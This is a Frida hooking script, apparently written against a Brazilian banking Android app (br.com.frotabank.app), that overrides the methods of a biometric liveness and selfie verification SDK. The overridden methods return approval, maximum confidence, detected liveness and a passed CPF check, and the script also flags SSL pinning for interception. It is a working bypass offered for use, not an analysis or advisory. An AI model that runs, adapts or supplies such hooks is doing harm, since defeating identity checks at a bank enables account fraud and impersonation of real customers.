/*
 * Frotabank APK - Frida Hook Quick Reference
 * Generated: October 13, 2026
 * Target: br.com.frotabank.app
 */

// ============================================================================
// MOST CRITICAL HOOKS - START HERE
// ============================================================================

console.log("[*] Loading Frotabank bypass hooks...");

// HOOK 1: Liveness Approval (HIGHEST PRIORITY)
try {
    var LivenessResult = Java.use("io.unico.liveness.sdk.core.LivenessResult");

    // Override isApproved to always return true
    LivenessResult.isApproved.implementation = function() {
        console.log("[+] HOOKED: LivenessResult.isApproved() -> TRUE");
        return true;
    };
} catch(e) {
    console.log("[-] LivenessResult hook failed: " + e);
}

// HOOK 2: Confidence Score Getter
try {
    var OzLivenessSDK = Java.use("io.unico.liveness.sdk.core.OzLivenessSDK");

    // Return maximum confidence
    OzLivenessSDK.getConfidenceScore.implementation = function() {
        console.log("[+] HOOKED: getConfidenceScore() -> 0.99");
        return 0.99;
    };
} catch(e) {
    console.log("[-] OzLivenessSDK.getConfidenceScore hook failed: " + e);
}

// HOOK 3: Selfie Face Detection
try {
    var SelfieCameraOpener = Java.use("io.unico.sdk.capture.SelfieCameraOpener");

    // Mock successful face detection
    SelfieCameraOpener.onFaceDetected.implementation = function(faceData) {
        console.log("[+] HOOKED: Face detection forced to success");
        // Call original with modifications if needed
        return this.onFaceDetected(faceData);
    };
} catch(e) {
    console.log("[-] SelfieCameraOpener hook failed: " + e);
}

// ============================================================================
// SECONDARY HOOKS - For complete bypass
// ============================================================================

// HOOK 4: Dorothy Analysis (Liveness Engine)
try {
    var DorothyAnalysis = Java.use("io.unico.liveness.dorothy.DorothyAnalysis");

    DorothyAnalysis.isLivenessDetected.implementation = function() {
        console.log("[+] HOOKED: DorothyAnalysis.isLivenessDetected() -> TRUE");
        return true;
    };
} catch(e) {
    console.log("[-] DorothyAnalysis hook failed: " + e);
}

// HOOK 5: Selfie XActivity Success Callback
try {
    var SelfieXActivity = Java.use("io.unico.sdk.capture.SelfieXActivity");

    if (SelfieXActivity.onSuccessSelfie) {
        SelfieXActivity.onSuccessSelfie.implementation = function(imageData) {
            console.log("[+] HOOKED: SelfieXActivity.onSuccessSelfie() called");
            return this.onSuccessSelfie(imageData);
        };
    }
} catch(e) {
    console.log("[-] SelfieXActivity hook failed: " + e);
}

// HOOK 6: CPF Validation (if present)
try {
    var UnicoConfigLiveness = Java.use("com.banking.UnicoConfigLiveness");

    if (UnicoConfigLiveness.validateCPF) {
        UnicoConfigLiveness.validateCPF.implementation = function(cpf) {
            console.log("[+] HOOKED: CPF Validation bypassed for " + cpf);
            return true;
        };
    }
} catch(e) {
    console.log("[-] CPF validation hook not available: " + e);
}

// ============================================================================
// UTILITY HOOKS - For monitoring and debugging
// ============================================================================

// HOOK 7: Monitor Liveness Status Changes
try {
    var StatusListener = Java.use("io.unico.liveness.sdk.core.StatusListener");

    StatusListener.onStatusChange.implementation = function(status) {
        console.log("[*] Liveness Status Changed: " + status);
        return this.onStatusChange(status);
    };
} catch(e) {
    console.log("[-] StatusListener hook failed: " + e);
}

// HOOK 8: Monitor Error Handling
try {
    var ErrorHandler = Java.use("io.unico.liveness.sdk.core.ErrorHandler");

    if (ErrorHandler.onError) {
        ErrorHandler.onError.implementation = function(error) {
            console.log("[!] Liveness Error: " + error);
            return this.onError(error);
        };
    }
} catch(e) {
    console.log("[-] ErrorHandler hook failed: " + e);
}

// HOOK 9: Monitor Network API Calls (Optional)
try {
    var SslPin = Java.use("io.unico.liveness.sdk.network.SslPin");

    console.log("[*] Network SSL Pinning detected - may need HTTPS interception");
} catch(e) {
    console.log("[-] SslPin not accessible: " + e);
}

// ============================================================================
// ADVANCED HOOKS - Field-level manipulation
// ============================================================================

// HOOK 10: Direct Field Manipulation (if methods don't work)
try {
    var LivenessResult = Java.use("io.unico.liveness.sdk.core.LivenessResult");
    var results = LivenessResult.$new();

    // Try to get and modify fields directly
    console.log("[*] LivenessResult fields available - attempting direct access...");
} catch(e) {
    console.log("[-] LivenessResult field access failed: " + e);
}

// ============================================================================
// COMPLETION MESSAGE
// ============================================================================

console.log("[+] ============================================================");
console.log("[+] Frotabank Frida hooks loaded successfully!");
console.log("[+] Hooks installed:");
console.log("[+]   1. LivenessResult.isApproved() -> TRUE");
console.log("[+]   2. OzLivenessSDK.getConfidenceScore() -> 0.99");
console.log("[+]   3. SelfieCameraOpener.onFaceDetected() -> Success");
console.log("[+]   4. DorothyAnalysis.isLivenessDetected() -> TRUE");
console.log("[+]   5. Additional monitoring and bypass hooks active");
console.log("[+] ============================================================");

